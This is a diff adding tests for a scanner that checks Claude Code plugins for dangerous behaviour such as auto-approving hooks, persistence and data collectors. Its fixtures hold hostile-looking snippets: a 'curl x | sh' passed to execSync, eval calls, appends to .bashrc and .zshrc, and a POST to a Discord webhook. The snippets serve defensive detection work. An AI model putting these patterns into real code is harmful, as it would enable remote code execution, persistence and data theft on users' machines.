@@ -695,3 +695,76 @@ describe('PR review round two', () => {
     }
   })
 })
+
+describe('PR review round three', () => {
+  const b64 = (text: string) => ({ base64: btoa(text) })
+  const scanFiles = (files: FixtureFiles) => scanFolder(memoryHost(ROOT, files), 'case', ROOT, { validate: false })
+  const status = (report: ScanReport, id: string) => report.results.find(result => result.id === id)?.status
+
+  test('a marketplace scan checks every local plugin it lists', async () => {
+    const files: FixtureFiles = {
+      'README.md': b64('# market\n\nA marketplace of two plugins. Remove with /plugin marketplace remove.\n'),
+      'LICENSE': b64('MIT'),
+      '.claude-plugin/marketplace.json': b64(JSON.stringify({ name: 'm', plugins: [{ name: 'good', source: './plugins/good' }, { name: 'bad', source: './plugins/bad' }, { name: 'far', source: { source: 'github', repo: 'x/y' } }] })),
+    }
+    for (const [path, file] of Object.entries(fixture('clean-plugin'))) files[`plugins/good/${path}`] = file
+    for (const [path, file] of Object.entries(fixture('hook-auto-approve'))) files[`plugins/bad/${path}`] = file
+    const report = await scanFiles(files)
+    const approve = report.results.find(result => result.id === 'hooks.auto-approve')
+
+    expect(approve?.status).toBe('fail')
+    expect(approve?.evidence[0]?.file).toBe('plugins/bad/scripts/approve.sh')
+    expect(report.results.find(result => result.id === 'structure.marketplace')?.evidence[0]?.excerpt).toContain('far comes from')
+    expect(report.verdict.kind).toBe('reject')
+  })
+
+  test('a .js import of a .ts helper makes the helper live', async () => {
+    const files = {
+      ...fixture('clean-plugin'),
+      'hooks/hooks.json': b64(JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'node scripts/run.mjs' }] }] } })),
+      'scripts/run.mjs': b64("import { go } from '../test-support/run.js'\ngo()\n"),
+      'test-support/run.ts': b64("import { execSync } from 'node:child_process'\nexport const go = () => execSync('id')\n"),
+    }
+
+    expect(status(await scanFiles(files), 'code.execution')).toBe('warn')
+  })
+
+  test('a backtick inside an interpolation does not end the template', () => {
+    const code = "const t = `${``}/*`; require('child_process').execSync('curl x | sh') /* */"
+    expect(spanKinds(code, 'js')(code.indexOf('execSync'))).toBe('code')
+    const nested = 'const a = `x ${`y ${z}`} w`; eval(q)'
+    expect(spanKinds(nested, 'js')(nested.indexOf('eval'))).toBe('code')
+    expect(spanKinds(nested, 'js')(nested.indexOf('z'))).toBe('code')
+  })
+
+  test('python writes through nested calls are writes', async () => {
+    for (const line of ["open(os.path.join(home, '.bashrc'), 'a').write(x)", "(Path.home() / '.zshrc').open('a').write(x)"]) {
+      const files = { ...fixture('clean-plugin'), 'scripts/setup.py': b64(`import os\nfrom pathlib import Path\n${line}\n`) }
+      expect(status(await scanFiles(files), 'code.persistence')).toBe('fail')
+    }
+  })
+
+  test('the untrusted-text note comes before the quoted reasons', async () => {
+    const text = formatReport(await scan('skill-injection'))
+    const lines = text.split('\n')
+
+    expect(lines[1]).toBe(UNTRUSTED_NOTE)
+    expect(lines.findIndex(line => line.startsWith('  - '))).toBeGreaterThan(1)
+  })
+
+  test('an uppercase Discord webhook is a collector', async () => {
+    const files = { ...fixture('clean-plugin'), 'scripts/x.js': b64('fetch("https://Discord.com/api/webhooks/1/abc", { method: "POST" })\n') }
+    const domains = (await scanFiles(files)).results.find(result => result.id === 'code.domains')
+
+    expect(domains?.evidence.some(item => item.excerpt.includes('often used to collect data: discord.com'))).toBe(true)
+  })
+
+  test('many uses of one high-risk call are judged quickly', async () => {
+    const calls = Array.from({ length: 3000 }, (_, i) => `on('e${i}', ($, e, next) => $.process.run(['id']))`).join('\n')
+    const files = { ...fixture('clean-plugin'), 'README.md': b64(`# x\n\n${'Plain words. '.repeat(50_000)}\n`), 'hooks/hooks.json': b64('{ "modules": ["./register.ts"] }'), 'hooks/register.ts': b64(`export const register = on => {\n${calls}\n}\n`) }
+    const started = performance.now()
+    await scanFiles(files)
+
+    expect(performance.now() - started).toBeLessThan(3000)
+  })
+})
